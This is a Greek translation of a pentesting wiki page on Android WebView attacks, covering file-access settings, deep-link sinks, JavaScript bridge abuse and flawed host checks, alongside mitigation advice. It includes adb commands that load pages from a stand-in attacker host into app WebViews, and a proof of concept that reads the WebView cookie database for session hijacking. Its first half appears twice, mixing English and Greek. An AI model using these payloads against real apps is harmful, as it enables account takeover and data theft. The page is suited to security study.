# WebView Επιθέσεις

{{#include ../../banners/hacktricks-training.md}}

## Οδηγός για τις ρυθμίσεις και την ασφάλεια του WebView

### Επισκόπηση των ευπαθειών του WebView

Ένα κρίσιμο στοιχείο της ανάπτυξης Android είναι η σωστή διαχείριση των WebView. Αυτός ο οδηγός επισημαίνει βασικές ρυθμίσεις και πρακτικές ασφάλειας για να μετριάσει τους κινδύνους που σχετίζονται με τη χρήση του WebView.

![Παράδειγμα WebView](<../../images/image (1190).png>)

### **Πρόσβαση αρχείων σε WebView**

Από προεπιλογή, τα WebView επιτρέπουν πρόσβαση σε αρχεία. Αυτή η λειτουργία ελέγχεται από τη μέθοδο `setAllowFileAccess()`, διαθέσιμη από το Android API level 3 (Cupcake 1.5). Εφαρμογές με την άδεια **android.permission.READ_EXTERNAL_STORAGE** μπορούν να διαβάσουν αρχεία από την εξωτερική αποθήκευση χρησιμοποιώντας το file URL scheme (`file://path/to/file`).

#### **Απαρχαιωμένα χαρακτηριστικά: Universal and File Access From URLs**

- **Universal Access From File URLs**: Αυτό το απαρχαιωμένο χαρακτηριστικό επέτρεπε cross-origin requests από file URLs, δημιουργώντας σημαντικό κίνδυνο ασφάλειας λόγω πιθανών XSS επιθέσεων. Η προεπιλεγμένη ρύθμιση είναι απενεργοποιημένη (`false`) για εφαρμογές που στοχεύουν Android Jelly Bean και νεότερα.
- Για να ελέγξετε αυτή τη ρύθμιση, χρησιμοποιήστε `getAllowUniversalAccessFromFileURLs()`.
- Για να τροποποιήσετε αυτή τη ρύθμιση, χρησιμοποιήστε `setAllowUniversalAccessFromFileURLs(boolean)`.
- **File Access From File URLs**: Αυτό το χαρακτηριστικό, επίσης απαρχαιωμένο, ελέγχει την πρόσβαση σε περιεχόμενο από άλλα file scheme URLs. Όπως και το universal access, η προεπιλεγμένη ρύθμιση είναι απενεργοποιημένη για αυξημένη ασφάλεια.
- Χρησιμοποιήστε `getAllowFileAccessFromFileURLs()` για έλεγχο και `setAllowFileAccessFromFileURLs(boolean)` για ρύθμιση.

#### **Ασφαλής φόρτωση αρχείων**

Για την απενεργοποίηση της πρόσβασης στο file system ενώ εξακολουθεί να επιτρέπεται η πρόσβαση σε assets και resources, χρησιμοποιείται η μέθοδος `setAllowFileAccess()`. Σε Android R και νεότερα, η προεπιλεγμένη ρύθμιση είναι `false`.

- Ελέγξτε με `getAllowFileAccess()`.
- Ενεργοποιήστε ή απενεργοποιήστε με `setAllowFileAccess(boolean)`.

#### **WebViewAssetLoader**

Η κλάση **WebViewAssetLoader** είναι η σύγχρονη προσέγγιση για φόρτωση τοπικών αρχείων. Χρησιμοποιεί http(s) URLs για πρόσβαση σε τοπικά assets και resources, εναρμονιζόμενη με την πολιτική Same-Origin, διευκολύνοντας έτσι τη διαχείριση του CORS.

### loadUrl

Αυτή είναι μια συνήθης συνάρτηση που χρησιμοποιείται για να φορτώνει αυθαίρετα URLs σε ένα WebView:
```java
webview.loadUrl("<url here>")
```
Φυσικά, ένας πιθανός επιτιθέμενος δεν θα πρέπει ποτέ να μπορεί να **ελέγχει το URL** που πρόκειται να φορτώσει μια εφαρμογή.

### **JavaScript και χειρισμός του Intent Scheme**

- **JavaScript**: Απενεργοποιημένο από προεπιλογή στα WebViews, μπορεί να ενεργοποιηθεί μέσω `setJavaScriptEnabled()`. Συνιστάται προσοχή, καθώς η ενεργοποίηση του JavaScript χωρίς κατάλληλα μέτρα ασφαλείας μπορεί να εισαγάγει ευπάθειες ασφαλείας.
- **Intent Scheme**: Τα WebViews μπορούν να χειριστούν το `intent` scheme, γεγονός που ενδέχεται να οδηγήσει σε exploits αν δεν διαχειριστούν προσεκτικά. Ένα παράδειγμα ευπάθειας περιελάμβανε έναν εκτεθειμένο παράμετρο WebView "support_url" που μπορούσε να χρησιμοποιηθεί για την εκτέλεση cross-site scripting (XSS) επιθέσεων.

![Ευάλωτο WebView](<../../images/image (1191).png>)

Παράδειγμα εκμετάλλευσης χρησιμοποιώντας adb:
```bash
adb.exe shell am start -n com.tmh.vulnwebview/.SupportWebView –es support_url "https://example.com/xss.html"
```
### Javascript Bridge

Το Android παρέχει μια δυνατότητα που επιτρέπει στο **JavaScript** μέσα σε ένα WebView να καλεί **εγγενείς λειτουργίες εφαρμογής Android**. Αυτό επιτυγχάνεται με τη χρήση της μεθόδου `addJavascriptInterface`, η οποία ενσωματώνει το JavaScript με εγγενείς λειτουργίες Android, και ονομάζεται _WebView JavaScript bridge_. Απαιτείται προσοχή, καθώς αυτή η μέθοδος επιτρέπει σε όλες τις σελίδες μέσα στο WebView να έχουν πρόσβαση στο καταχωρημένο JavaScript Interface object, δημιουργώντας κίνδυνο ασφάλειας εάν ευαίσθητες πληροφορίες εκτίθενται μέσω αυτών των διεπαφών.

- **Απαιτείται άκρα προσοχή** για εφαρμογές που στοχεύουν Android εκδόσεις κάτω από 4.2 λόγω μιας ευπάθειας που επιτρέπει remote code execution μέσω κακόβουλου JavaScript, εκμεταλλευόμενη reflection.

#### Implementing a JavaScript Bridge

- **JavaScript interfaces** μπορούν να αλληλεπιδρούν με εγγενή κώδικα, όπως φαίνεται στα παραδείγματα όπου μια μέθοδος κλάσης εκτίθεται στο JavaScript:
```javascript
@JavascriptInterface
public String getSecret() {
return "SuperSecretPassword";
};
```
- JavaScript Bridge ενεργοποιείται με την προσθήκη ενός interface στο WebView:
```javascript
webView.addJavascriptInterface(new JavascriptBridge(), "javascriptBridge")
webView.reload()
```
- Πιθανή εκμετάλλευση μέσω JavaScript, για παράδειγμα μέσω επίθεσης XSS, επιτρέπει την κλήση εκτεθειμένων μεθόδων Java:
```html
<script>
alert(javascriptBridge.getSecret())
</script>
```
- Για να μετριάσετε τους κινδύνους, **περιορίστε τη χρήση JavaScript bridge** στον κώδικα που περιλαμβάνεται στο APK και αποτρέψτε τη φόρτωση JavaScript από απομακρυσμένες πηγές. Σε παλαιότερες συσκευές, ορίστε το ελάχιστο API level σε 17.

### Reflection-based Remote Code Execution (RCE)

- Μια τεκμηριωμένη μέθοδος επιτρέπει την επίτευξη RCE μέσω reflection με την εκτέλεση ενός συγκεκριμένου payload. Ωστόσο, η annotation `@JavascriptInterface` αποτρέπει τη μη εξουσιοδοτημένη πρόσβαση σε μεθόδους, περιορίζοντας την επιφάνεια επίθεσης.

### Remote Debugging

- **Remote debugging** είναι δυνατή με τα **Chrome Developer Tools**, επιτρέποντας αλληλεπίδραση και αυθαίρετη εκτέλεση JavaScript στο περιεχόμενο του WebView.

#### Enabling Remote Debugging

- Remote debugging μπορεί να ενεργοποιηθεί για όλα τα WebViews μέσα σε μια εφαρμογή με:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
WebView.setWebContentsDebuggingEnabled(true);
}
```
- Για να ενεργοποιήσετε υπό όρους το debugging με βάση την κατάσταση debuggable της εφαρμογής:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
if (0 != (getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE))
{ WebView.setWebContentsDebuggingEnabled(true); }
}
```
## Exfiltrate αυθαίρετα αρχεία

- Επιδεικνύει την exfiltration αυθαίρετων αρχείων χρησιμοποιώντας ένα XMLHttpRequest:
```javascript
var xhr = new XMLHttpRequest()
xhr.onreadystatechange = function () {
if (xhr.readyState == XMLHttpRequest.DONE) {
alert(xhr.responseText)
}
}
xhr.open(
"GET",
"file:///data/data/com.authenticationfailure.wheresmybrowser/databases/super_secret.db",
true
)
xhr.send(null)
```
# Webview Επιθέσεις



## Guide on WebView Configurations and Security

### Επισκόπηση ευπαθειών WebView

A critical aspect of Android development involves the correct handling of WebViews. This guide highlights key configurations and security practices to mitigate risks associated with WebView usage.

![WebView Example](<../../images/image (1190).png>)

### **File Access in WebViews**

By default, WebViews permit file access. This functionality is controlled by the `setAllowFileAccess()` method, available since Android API level 3 (Cupcake 1.5). Applications with the **android.permission.READ_EXTERNAL_STORAGE** permission can read files from external storage using a file URL scheme (`file://path/to/file`).

#### **Deprecated Features: Universal and File Access From URLs**

- **Universal Access From File URLs**: Αυτή η αποσυρμένη λειτουργία επέτρεπε cross-origin αιτήματα από file URLs, δημιουργώντας σημαντικό κίνδυνο ασφάλειας λόγω πιθανών XSS επιθέσεων. Η προεπιλεγμένη ρύθμιση είναι απενεργοποιημένη (`false`) για εφαρμογές που στοχεύουν Android Jelly Bean και νεότερα.
- Για να ελέγξετε αυτή τη ρύθμιση, χρησιμοποιήστε `getAllowUniversalAccessFromFileURLs()`.
- Για να τροποποιήσετε αυτή τη ρύθμιση, χρησιμοποιήστε `setAllowUniversalAccessFromFileURLs(boolean)`.
- **File Access From File URLs**: Αυτή η λειτουργία, επίσης αποσυρμένη, ελέγχει την πρόσβαση σε περιεχόμενο από άλλα file scheme URLs. Όπως και η universal access, η προεπιλεγμένη ρύθμιση είναι απενεργοποιημένη για αυξημένη ασφάλεια.
- Χρησιμοποιήστε `getAllowFileAccessFromFileURLs()` για έλεγχο και `setAllowFileAccessFromFileURLs(boolean)` για ρύθμιση.

#### **Secure File Loading**

Για απενεργοποίηση της πρόσβασης στο file system ενώ εξακολουθούν να είναι προσβάσιμα assets και resources, χρησιμοποιείται η μέθοδος `setAllowFileAccess()`. Σε Android R και νεότερα, η προεπιλεγμένη ρύθμιση είναι `false`.

- Ελέγξτε με `getAllowFileAccess()`.
- Ενεργοποιήστε ή απενεργοποιήστε με `setAllowFileAccess(boolean)`.

#### **WebViewAssetLoader**

Η κλάση **WebViewAssetLoader** είναι η σύγχρονη προσέγγιση για φόρτωση τοπικών αρχείων. Χρησιμοποιεί http(s) URLs για πρόσβαση σε τοπικά assets και resources, ευθυγραμμιζόμενη με την πολιτική Same-Origin, διευκολύνοντας έτσι τη διαχείριση CORS.

### loadUrl

Αυτή είναι μια συνήθης συνάρτηση που χρησιμοποιείται για να φορτώνει αυθαίρετα URLs σε ένα WebView:
```java
webview.loadUrl("<url here>")
```
Φυσικά, ένας πιθανός επιτιθέμενος δεν θα πρέπει ποτέ να μπορεί να **ελέγχει το URL** που μια εφαρμογή πρόκειται να φορτώσει.

### Deep-linking σε εσωτερικό WebView (custom scheme → WebView sink)

Πολλές εφαρμογές καταχωρούν custom schemes/paths που δρομολογούν ένα user-supplied URL σε ένα in-app WebView. Αν το deep link είναι exported (VIEW + BROWSABLE), ένας attacker μπορεί να αναγκάσει την εφαρμογή να αποδώσει αυθαίρετο απομακρυσμένο περιεχόμενο μέσα στο WebView context της.

Τυπικό μοτίβο manifest (απλοποιημένο):
```xml
<activity android:name=".MainActivity" android:exported="true">
<intent-filter>
<action android:name="android.intent.action.VIEW" />
<category android:name="android.intent.category.DEFAULT" />
<category android:name="android.intent.category.BROWSABLE" />
<data android:scheme="myscheme" android:host="com.example.app" />
</intent-filter>
</activity>
```
Κοινή ροή κώδικα (απλοποιημένη):
```java
// Entry activity
@Override
protected void onNewIntent(Intent intent) {
Uri deeplink = intent.getData();
String url = deeplink.getQueryParameter("url"); // attacker-controlled
if (deeplink.getPathSegments().get(0).equals("web")) {
Intent i = new Intent(this, WebActivity.class);
i.putExtra("url", url);
startActivity(i);
}
}

// WebActivity sink
webView.loadUrl(getIntent().getStringExtra("url"));
```
Πρότυπο επίθεσης και PoC μέσω adb:
```bash
# Template – force load in internal WebView
adb shell am start -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"

# If a specific Activity must be targeted
adb shell am start -n com.example/.MainActivity -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"
```
Impact: η απομακρυσμένη σελίδα εκτελείται στο app WebView context (cookies/session του προφίλ WebView της εφαρμογής, πρόσβαση σε οποιοδήποτε εκτεθειμένο @JavascriptInterface, πιθανή πρόσβαση σε content:// και file:// ανάλογα με τις ρυθμίσεις).

Hunting tips:
- Grep σε αποσυμπιεσμένες πηγές για `getQueryParameter("url")`, `loadUrl(`, `WebView` sinks, και χειριστές deep-link (`onCreate/onNewIntent`).
- Ελέγξτε το manifest για φίλτρα VIEW+BROWSABLE και custom schemes/hosts που αντιστοιχούν σε activities που στη συνέχεια ξεκινούν ένα WebView.
- Ελέγξτε αν υπάρχουν πολλαπλές deep-link διαδρομές (π.χ., μια “external browser” διαδρομή έναντι μιας “internal webview” διαδρομής) και προτιμήστε αυτή που αποδίδει εντός της εφαρμογής.

### Enabling JavaScript before verification (order-of-checks bug)

Ένα συχνό λάθος σκληροποίησης είναι η ενεργοποίηση της JavaScript ή η ρύθμιση χαλαρών ρυθμίσεων του WebView πριν ολοκληρωθεί η τελική allowlist/επαλήθευση του URL-στόχου. Αν η επαλήθευση είναι ασυνεπής μεταξύ βοηθητικών μεθόδων ή γίνει πολύ αργά, ένας κακόβουλος deep link μπορεί να φτάσει σε κατάσταση όπου:

1) Οι ρυθμίσεις του WebView εφαρμόζονται (π.χ., `setJavaScriptEnabled(true)`), και
2) Το μη αξιόπιστο URL φορτώνεται με ενεργοποιημένη την JavaScript.

Μοτίβο σφάλματος (ψευδοκώδικας):
```java
// 1) Parse/early checks
Uri u = parse(intent);
if (!looksValid(u)) return;

// 2) Configure WebView BEFORE final checks
webView.getSettings().setJavaScriptEnabled(true); // BAD: too early
configureMixedContent();

// 3) Do final verification (late)
if (!finalAllowlist(u)) return; // too late – JS already enabled

// 4) Load
webView.loadUrl(u.toString());
```
Γιατί είναι εκμεταλλεύσιμο
- Αντισυνεπής κανονικοποίηση: οι helpers χωρίζουν/ανασυνθέτουν το URL διαφορετικά από τον τελικό έλεγχο, δημιουργώντας ασυμφωνίες που ένα κακόβουλο URL μπορεί να εκμεταλλευτεί.
- Λανθασμένη σειρά στο pipeline: η ενεργοποίηση του JS στο step 2 εφαρμόζεται παγκοσμίως στην WebView instance, επηρεάζοντας την τελική φόρτωση ακόμη κι αν η verification αποτύχει αργότερα.

Πώς να δοκιμάσετε
- Δημιουργήστε deep-link payloads που περνούν τους πρώιμους ελέγχους και φτάνουν στο WebView configuration site.
- Χρησιμοποιήστε adb για να πυροδοτήσετε implicit VIEW intents που παραδίδουν παράμετρο `url=` υπό τον έλεγχό σας:
```bash
adb shell am start -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"
```
Εάν exploitation succeeds, το payload σας εκτελεί JavaScript στο WebView της εφαρμογής. Από εκεί, ανιχνεύστε για εκτεθειμένα bridges:
```html
<script>
for (let k in window) {
try { if (typeof window[k] === 'object' || typeof window[k] === 'function') console.log('[JSI]', k); } catch(e){}
}
</script>
```
Οδηγίες άμυνας
- Κανονικοποιήστε μία φορά· επικυρώστε αυστηρά έναν μόνο σημείο αναφοράς (scheme/host/path/query).
- Καλέστε `setJavaScriptEnabled(true)` μόνο μετά την επιτυχία όλων των allowlist ελέγχων και αμέσως πριν το φόρτωμα αξιόπιστου περιεχομένου.
- Αποφύγετε την έκθεση του `@JavascriptInterface` σε μη αξιόπιστες προελεύσεις· προτιμήστε έλεγχο ανά προέλευση.
- Σκεφτείτε ξεχωριστές WebView instances για αξιόπιστο έναντι μη αξιόπιστου περιεχομένου, με JS απενεργοποιημένο εξ ορισμού.

### **Χειρισμός JavaScript και Intent Scheme**

- **JavaScript**: Απενεργοποιημένο εξ ορισμού σε WebViews, μπορεί να ενεργοποιηθεί μέσω `setJavaScriptEnabled()`. Απαιτείται προσοχή, καθώς η ενεργοποίηση του JavaScript χωρίς κατάλληλα μέτρα προστασίας μπορεί να εισαγάγει ευπάθειες ασφαλείας.
- **Intent Scheme**: Τα WebViews μπορούν να χειριστούν το `intent` scheme, ενδεχομένως οδηγώντας σε exploits αν δεν διαχειριστεί σωστά. Ένα παράδειγμα ευπάθειας αφορούσε μια εκτεθειμένη παράμετρο WebView "support_url" που μπορούσε να εκμεταλλευτεί για την εκτέλεση cross-site scripting (XSS) επιθέσεων.

![Vulnerable WebView](<../../images/image (1191).png>)

Exploitation example using adb:
```bash
adb.exe shell am start -n com.tmh.vulnwebview/.SupportWebView –es support_url "https://example.com/xss.html"
```
### Javascript Bridge

Το Android παρέχει μια δυνατότητα που επιτρέπει στη **JavaScript** σε ένα WebView να καλεί **εγγενείς συναρτήσεις εφαρμογών Android**. Αυτό επιτυγχάνεται με τη χρήση της μεθόδου `addJavascriptInterface`, η οποία ενσωματώνει τη JavaScript με εγγενείς λειτουργίες Android, ονομαζόμενη ως _WebView JavaScript bridge_. Συνίσταται προσοχή, καθώς αυτή η μέθοδος επιτρέπει σε όλες τις σελίδες εντός του WebView να έχουν πρόσβαση στο εγγεγραμμένο JavaScript Interface αντικείμενο, δημιουργώντας κίνδυνο ασφαλείας εάν ευαίσθητες πληροφορίες εκτεθούν μέσω αυτών των διεπαφών.

- **Απαιτείται ακραία προσοχή** για εφαρμογές που στοχεύουν εκδόσεις Android κάτω από 4.2, λόγω ευπάθειας που επιτρέπει remote code execution μέσω κακόβουλης JavaScript, εκμεταλλευόμενης reflection.

#### Implementing a JavaScript Bridge

- **JavaScript interfaces** μπορούν να αλληλεπιδράσουν με native code, όπως φαίνεται στα παραδείγματα όπου μια μέθοδος κλάσης εκτίθεται στη JavaScript:
```javascript
@JavascriptInterface
public String getSecret() {
return "SuperSecretPassword";
};
```
- JavaScript Bridge ενεργοποιείται με την προσθήκη ενός interface στο WebView:
```javascript
webView.addJavascriptInterface(new JavascriptBridge(), "javascriptBridge")
webView.reload()
```
- Πιθανή εκμετάλλευση μέσω JavaScript, για παράδειγμα μέσω XSS attack, επιτρέπει την κλήση εκτεθειμένων Java μεθόδων:
```html
<script>
alert(javascriptBridge.getSecret())
</script>
```
- Για να μειώσετε τους κινδύνους, **restrict JavaScript bridge usage** μόνο στον κώδικα που περιλαμβάνεται στο APK και αποτρέψτε τη φόρτωση JavaScript από απομακρυσμένες πηγές. Για παλαιότερες συσκευές, ορίστε το minimum API level σε 17.

#### Κατάχρηση dispatcher-style JS bridges (invokeMethod/handlerName)

Ένα συνηθισμένο μοτίβο είναι μία μεμονωμένη εξαγόμενη μέθοδος (π.χ., `@JavascriptInterface void invokeMethod(String json)`) που απο-σειριοποιεί attacker-controlled JSON σε ένα γενικό αντικείμενο και δρομολογεί με βάση ένα παρεχόμενο handler name. Τυπική μορφή JSON:
```json
{
"handlerName": "toBase64",
"callbackId": "cb_12345",
"asyncExecute": "true",
"data": { /* handler-specific fields */ }
}
```
Risk: if any registered handler performs privileged actions on attacker data (e.g., direct file reads), you can call it by setting `handlerName` accordingly. Results are usually posted back into the page context via `evaluateJavascript` and a callback/promise mechanism keyed by `callbackId`.

Key hunting steps
- Decompile και grep για `addJavascriptInterface(` για να μάθετε το όνομα του bridge object (π.χ., `xbridge`).
- Στα Chrome DevTools (chrome://inspect), πληκτρολογήστε το όνομα του bridge object στην Console (π.χ. `xbridge`) για να απαριθμήσετε τα εκτεθειμένα πεδία/μεθόδους· αναζητήστε έναν generic dispatcher όπως `invokeMethod`.
- Απαριθμήστε τους handlers αναζητώντας κλάσεις που υλοποιούν `getModuleName()` ή registration maps.

#### Arbitrary file read via URI → File sinks (Base64 exfiltration)

If a handler takes a URI, calls `Uri.parse(req.getUri()).getPath()`, builds `new File(...)` and reads it without allowlists or sandbox checks, you get an arbitrary file read in the app sandbox that bypasses WebView settings like `setAllowFileAccess(false)` (the read happens in native code, not via the WebView network stack).

PoC για να exfiltrate the Chromium WebView cookie DB (session hijack):
```javascript
// Minimal callback sink so native can deliver the response
window.WebViewJavascriptBridge = {
_handleMessageFromObjC: function (data) { console.log(data) }
};

const payload = JSON.stringify({
handlerName: 'toBase64',
callbackId: 'cb_' + Date.now(),
data: { uri: 'file:///data/data/<pkg>/app_webview/Default/Cookies' }
});

xbridge.invokeMethod(payload);
```
Σημειώσεις
- Cookie DB paths vary across devices/providers. Common ones:
- `file:///data/data/<pkg>/app_webview/Default/Cookies`
- `file:///data/data/<pkg>/app_webview_<pkg>/Default/Cookies`
- The handler returns Base64; decode to recover cookies and impersonate the user in the app’s WebView profile.

Συμβουλές ανίχνευσης
- Watch for large Base64 strings returned via `evaluateJavascript` when using the app.
- Grep decompiled sources for handlers that accept `uri`/`path` and convert them to `new File(...)`.

#### Παράκαμψη των περιορισμών προνομίων του WebView – endsWith() host checks

Privilege decisions (selecting a JSB-enabled Activity) often rely on host allowlists. A flawed pattern is:
```java
String host = Uri.parse(url).getHost();
boolean z = true;
if (!host.endsWith(".trusted.com")) {
if (!".trusted.com".endsWith(host)) {
z = false;
}
}
// z==true → open privileged WebView
```
Ισοδύναμη λογική (De Morgan’s):
```java
boolean z = host.endsWith(".trusted.com") ||
".trusted.com".endsWith(host);
```
Αυτό δεν είναι έλεγχος origin. Πολλοί ανεπιθύμητοι hosts ικανοποιούν τη δεύτερη ρήτρα, επιτρέποντας σε μη αξιόπιστους domains να εισέλθουν στην privileged Activity. Πάντα επαληθεύετε το scheme και το host έναντι ενός αυστηρού allowlist (ακριβής ταύτιση ή σωστός έλεγχος subdomain με dot-boundaries), όχι κόλπα με `endsWith`.

#### javascript:// execution primitive via loadUrl

Μόλις βρεθούν μέσα σε ένα προνομιακό WebView, οι εφαρμογές μερικές φορές εκτελούν inline JS μέσω:
```java
webView.loadUrl("javascript:" + jsPayload);
```
If an internal flow triggers `loadUrl("javascript:...")` in that context, injected JS executes with bridge access even if the external page wouldn’t normally be allowed. Pentest steps:
- Grep for `loadUrl("javascript:` and `evaluateJavascript(` in the app.
- Try to reach those code paths after forcing navigation to the privileged WebView (e.g., via a permissive deep link chooser).
- Use the primitive to call the dispatcher (`xbridge.invokeMethod(...)`) and reach sensitive handlers.

Μέτρα μετριασμού (λίστα ελέγχου για προγραμματιστές)
- Αυστηρός έλεγχος προέλευσης για privileged Activities: canonicalize και συγκρίνετε scheme/host με explicit allowlist· αποφύγετε `endsWith`-based checks. Consider Digital Asset Links όταν εφαρμόζεται.
- Scope τα bridges μόνο σε trusted pages και επανελέγχετε την εμπιστοσύνη σε κάθε κλήση (per-call authorization).
- Αφαιρέστε ή προστατέψτε αυστηρά filesystem-capable handlers· προτιμήστε `content://` με allowlists/permissions αντί για raw `file://` paths.
- Αποφύγετε `loadUrl("javascript:")` σε privileged contexts ή περιορίστε το πίσω από ισχυρούς ελέγχους.
- Θυμηθείτε ότι `setAllowFileAccess(false)` δεν προστατεύει από native file reads μέσω του bridge.

#### JSB enumeration and debugging tips

- Enable WebView remote debugging to use Chrome DevTools Console:
- App-side (debug builds): `WebView.setWebContentsDebuggingEnabled(true)`
- System-side: modules like [LSPosed](https://github.com/LSPosed/LSPosed) or Frida scripts can force-enable debugging even in release builds. Example Frida snippet for Cordova WebViews: [cordova enable webview debugging](http://codeshare.frida.re/@gameFace22/cordova---enable-webview-debugging/)
- In DevTools, type the bridge object name (e.g., `xbridge`) to see exposed members and probe the dispatcher.


### Reflection-based Remote Code Execution (RCE)

- Μια τεκμηριωμένη μέθοδος επιτρέπει την επίτευξη RCE μέσω reflection εκτελώντας συγκεκριμένο payload. Ωστόσο, η annotation `@JavascriptInterface` αποτρέπει μη εξουσιοδοτημένη πρόσβαση σε μεθόδους, περιορίζοντας την επιφάνεια επίθεσης.

### Remote Debugging

- **Remote debugging** είναι εφικτό με **Chrome Developer Tools**, επιτρέποντας αλληλεπίδραση και εκτέλεση αυθαίρετου JavaScript εντός του περιεχομένου του WebView.

#### Ενεργοποίηση Remote Debugging

- Remote debugging μπορεί να ενεργοποιηθεί για όλα τα WebViews μέσα σε μια εφαρμογή με:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
WebView.setWebContentsDebuggingEnabled(true);
}
```
- Για να ενεργοποιήσετε το debugging υπό όρους, ανάλογα με την debuggable κατάσταση της εφαρμογής:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
if (0 != (getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE))
{ WebView.setWebContentsDebuggingEnabled(true); }
}
```
## Exfiltrate arbitrary files

- Επιδεικνύει την exfiltration αυθαίρετων αρχείων χρησιμοποιώντας ένα XMLHttpRequest:
```javascript
var xhr = new XMLHttpRequest()
xhr.onreadystatechange = function () {
if (xhr.readyState == XMLHttpRequest.DONE) {
alert(xhr.responseText)
}
}
xhr.open(
"GET",
"file:///data/data/com.authenticationfailure.wheresmybrowser/databases/super_secret.db",
true
)
xhr.send(null)
```
## Αναφορές

- [Ανασκόπηση των διανυσμάτων επίθεσης πρόσβασης αρχείων σε Android WebViews](https://labs.integrity.pt/articles/review-android-webviews-fileaccess-attack-vectors/index.html)
- [WheresMyBrowser.Android (demo εφαρμογή)](https://github.com/authenticationfailure/WheresMyBrowser.Android)
- [Αναφορά Android WebView](https://developer.android.com/reference/android/webkit/WebView)
- [Deep Links & WebViews Exploitations – Μέρος II](https://medium.com/@justmobilesec/deep-links-webviews-exploitations-part-ii-5c0b118ec6f1)
- [Deep Links & WebViews Exploitations – Μέρος I](https://www.justmobilesec.com/en/blog/deep-links-webviews-exploitations-part-I)
- [Samsung S24 Exploit Chain Pwn2Own 2024 Walkthrough](https://medium.com/@happyjester80/samsung-s24-exploit-chain-pwn2own-2024-walkthrough-c7a3da9a7a26)
- [Pwn2Own Ireland 2024 – Samsung S24 attack chain (whitepaper)](https://maliciouserection.com/2025/05/13/pwn2own-ireland-2024-samsung-s24-attack-chain-whitepaper.html)
- [Βίντεο επίδειξης](https://www.youtube.com/watch?v=LAIr2laU-So)
- [Κατάληψη λογαριασμού σε Android app μέσω JSB – tuxplorer.com](https://tuxplorer.com/posts/account-takeover-via-jsb/)
- [LSPosed – systemless Xposed framework](https://github.com/LSPosed/LSPosed)
- [Frida codeshare: Cordova – enable WebView debugging](http://codeshare.frida.re/@gameFace22/cordova---enable-webview-debugging/)

{{#include ../../banners/hacktricks-training.md}}
